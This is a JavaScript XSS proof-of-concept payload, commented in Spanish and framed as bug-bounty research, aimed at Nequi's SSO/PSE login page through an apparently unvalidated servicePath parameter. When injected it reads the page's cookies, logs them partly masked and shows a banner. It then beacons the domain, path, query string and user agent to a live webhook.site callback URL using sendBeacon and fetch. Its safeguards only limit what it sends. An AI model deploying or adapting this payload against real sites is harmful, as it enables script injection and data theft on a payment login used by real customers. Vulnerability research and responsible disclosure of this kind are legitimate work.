/**
 * ============================================================
 *  XSS PoC v2 — Nequi SSO / PSE
 *  Investigación de seguridad responsable (Bug Bounty)
 *  Propósito: Demostrar ejecución de script arbitrario via
 *             parámetro servicePath sin validación en login.js
 *
 *  ⚠️  SOLO PARA USO EN PROGRAMAS DE BUG BOUNTY AUTORIZADOS
 *  ⚠️  NO exfiltra credenciales reales ni datos sensibles
 *  ⚠️  NO modifica el flujo de autenticación
 * ============================================================
 */

(function () {
    "use strict";

    // ============================================================
    //  CONFIGURACIÓN — Modifica esta variable antes de desplegar
    // ============================================================
    var CALLBACK_URL = "https://webhook.site/34882c2e-28b2-477b-a797-8a7684af5ca5";
    // Ejemplos de webhooks para pruebas inocuas:
    //   https://webhook.site/<tu-id>
    //   https://requestbin.net/r/<tu-id>
    //   https://hookb.in/<tu-id>

    // ============================================================
    //  1. RECOLECCIÓN DE INFORMACIÓN (sólo metadata pública)
    // ============================================================
    var domain    = document.domain;
    var href      = window.location.href;
    var timestamp = new Date().toISOString();

    // Censurar cookies para el reporte: mostrar nombre de la cookie
    // pero ocultar el valor (nunca enviar tokens reales)
    var rawCookies = document.cookie;
    var cookiesCensored = rawCookies
        ? rawCookies.split(";").map(function (c) {
              var parts = c.trim().split("=");
              var name  = parts[0];
              // Mostrar los 4 primeros caracteres del valor y censurar el resto
              var val   = (parts[1] || "");
              var censored = val.length > 4
                  ? val.substring(0, 4) + "****[CENSURADO]"
                  : "****[CENSURADO]";
              return name + "=" + censored;
          }).join("; ")
        : "(sin cookies accesibles)";

    // ============================================================
    //  2. LOG EN CONSOLA — Visible en DevTools (F12 → Console)
    // ============================================================
    console.log("╔══════════════════════════════════════════════╗");
    console.log("║  [XSS-POC] Script arbitrario ejecutado       ║");
    console.log("╠══════════════════════════════════════════════╣");
    console.log("║  Dominio   :", domain);
    console.log("║  URL       :", href);
    console.log("║  Cookies   :", cookiesCensored);
    console.log("║  Timestamp :", timestamp);
    console.log("╚══════════════════════════════════════════════╝");
    console.warn("[XSS-POC] Ejecutado en dominio: " + domain + " — " + timestamp);

    // ============================================================
    //  3. BANNER VISUAL — Confirmación inmediata en pantalla
    // ============================================================
    function showBanner() {
        // Evitar duplicados si el script se carga más de una vez
        if (document.getElementById("xss-poc-v2-banner")) return;

        var banner = document.createElement("div");
        banner.id  = "xss-poc-v2-banner";

        banner.innerHTML = [
            "<div style='font-size:20px;font-weight:bold;margin-bottom:8px;'>",
            "  ⚠️ [XSS-POC v2] Script arbitrario ejecutado",
            "</div>",
            "<table style='font-size:13px;border-collapse:collapse;width:100%;max-width:780px;margin:0 auto;'>",
            "  <tr><td style='padding:3px 12px;opacity:.7;white-space:nowrap;'>🌐 Dominio</td>",
            "      <td style='padding:3px 8px;font-weight:bold;'>" + escapeHtml(domain) + "</td></tr>",
            "  <tr><td style='padding:3px 12px;opacity:.7;white-space:nowrap;'>🔗 URL</td>",
            "      <td style='padding:3px 8px;word-break:break-all;'>" + escapeHtml(href.substring(0, 120)) + (href.length > 120 ? "…" : "") + "</td></tr>",
            "  <tr><td style='padding:3px 12px;opacity:.7;white-space:nowrap;'>🍪 Cookies</td>",
            "      <td style='padding:3px 8px;word-break:break-all;'>" + escapeHtml(cookiesCensored) + "</td></tr>",
            "  <tr><td style='padding:3px 12px;opacity:.7;white-space:nowrap;'>🕐 Timestamp</td>",
            "      <td style='padding:3px 8px;'>" + escapeHtml(timestamp) + "</td></tr>",
            "</table>",
            "<div style='margin-top:10px;font-size:11px;opacity:.7;'>",
            "  Bug Bounty PoC — Solo para investigación responsable. No se exfiltraron datos reales.",
            "</div>"
        ].join("");

        banner.style.cssText = [
            "position:fixed",
            "top:0",
            "left:0",
            "right:0",
            "background:linear-gradient(135deg,#c0392b,#922b21)",
            "color:#fff",
            "padding:18px 24px",
            "text-align:center",
            "font-family:monospace",
            "z-index:2147483647",
            "box-shadow:0 4px 20px rgba(0,0,0,.5)",
            "border-bottom:3px solid #f1c40f"
        ].join(";");

        // Intentar adjuntar al body; si no existe aún, esperar
        if (document.body) {
            document.body.appendChild(banner);
        } else {
            document.addEventListener("DOMContentLoaded", function () {
                document.body.appendChild(banner);
            });
        }
    }

    // ============================================================
    //  4. SEÑAL AL CALLBACK (webhook configurable)
    //     Solo envía metadata inocua — nunca credenciales reales
    // ============================================================
    function sendSignal() {
        if (CALLBACK_URL === "https://TU-WEBHOOK-AQUI.com/callback") {
            console.info("[XSS-POC] CALLBACK_URL no configurado — señal omitida.");
            return;
        }

        var payload = JSON.stringify({
            poc_version : "v2",
            event       : "xss_confirmed",
            domain      : domain,
            // URL completa solo para el investigador (NO incluye credenciales)
            url_path    : window.location.pathname + window.location.search.substring(0, 80),
            cookies_present: rawCookies.length > 0,
            timestamp   : timestamp,
            user_agent  : navigator.userAgent
        });

        // Método 1: sendBeacon (no bloquea la carga de la página)
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon(CALLBACK_URL, payload);
                console.log("[XSS-POC] Señal enviada via sendBeacon →", CALLBACK_URL);
                return;
            }
        } catch (e) { /* fallback */ }

        // Método 2: fetch no-cors
        try {
            fetch(CALLBACK_URL, {
                method  : "POST",
                body    : payload,
                mode    : "no-cors",
                headers : { "Content-Type": "application/json" }
            });
            console.log("[XSS-POC] Señal enviada via fetch →", CALLBACK_URL);
        } catch (e) {
            console.warn("[XSS-POC] fetch falló:", e.message);
        }
    }

    // ============================================================
    //  UTILIDAD — Escapar HTML para evitar XSS-in-PoC (ironic)
    // ============================================================
    function escapeHtml(str) {
        return String(str)
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;");
    }

    // ============================================================
    //  INICIALIZACIÓN
    // ============================================================
    showBanner();
    sendSignal();

})();
